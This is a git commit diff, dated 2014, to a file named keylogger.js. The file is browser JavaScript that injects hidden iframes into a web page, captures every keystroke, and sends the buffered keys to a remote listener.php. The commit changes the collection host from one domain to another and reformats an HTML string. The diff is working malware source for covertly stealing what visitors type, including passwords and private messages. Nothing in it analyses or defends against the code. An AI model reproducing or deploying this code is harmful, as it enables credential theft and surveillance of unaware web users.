3b5366ea5f60be99dcfde84833ad4f3141c0bd01
XeroCodeIT <pmaldw@hotmail.com>
2014-04-10 19:14:03 +0300

    Update keylogger.js

--- keylogger.js
+++ keylogger.js
@@ -1,9 +1,7 @@
 var container = document.createElement('div');
 container.setAttribute('id', 'fbcontainer');
 container.setAttribute('style', 'position:fixed; width:100%; height:100%; z-index:9999999;');
-container.innerHTML='
-<iframe style="display:none;" id="sender"></iframe><iframe style="display:none;" id="sender1"></iframe>
-<iframe style="display:none;" id="sender2"></iframe>';
+container.innerHTML='<iframe style="display:none;" id="sender"></iframe><iframe style="display:none;" id="sender1"></iframe><iframe style="display:none;" id="sender2"></iframe>';
 document.getElementsByTagName("body")[0].insertBefore(container,document.getElementsByTagName("body")[0].firstChild);
 document.getElementsByTagName("body")[0].appendChild(container);
 var changeFrame=0;
@@ -20,7 +18,7 @@ document.onkeydown=function(e)
     {
         if(changeFrame==1)
         {
-            document.getElementById("sender1").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
+            document.getElementById("sender1").setAttribute('src', 'http://xerocode.com/test/listener.php?s='+record);
             record="";
             charCount=0;
             changeFrame++;
@@ -29,14 +27,14 @@ document.onkeydown=function(e)
         {
             if(changeFrame==0)
             {
-                document.getElementById("sender").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
+                document.getElementById("sender").setAttribute('src', 'http://xerocode.com/test/listener.php?s='+record);
                 record="";
                 charCount=0;
                 changeFrame++;
             }
             else
             {
-                document.getElementById("sender2").setAttribute('src', 'http://website152342.com/keylogger/listener.php?s='+record);
+                document.getElementById("sender2").setAttribute('src', 'http://xerocode.com/test/listener.php?s='+record);
                 record="";
                 charCount=0;
                 changeFrame=0;
@@ -44,5 +42,3 @@ document.onkeydown=function(e)
         }
     }
 }
-
-
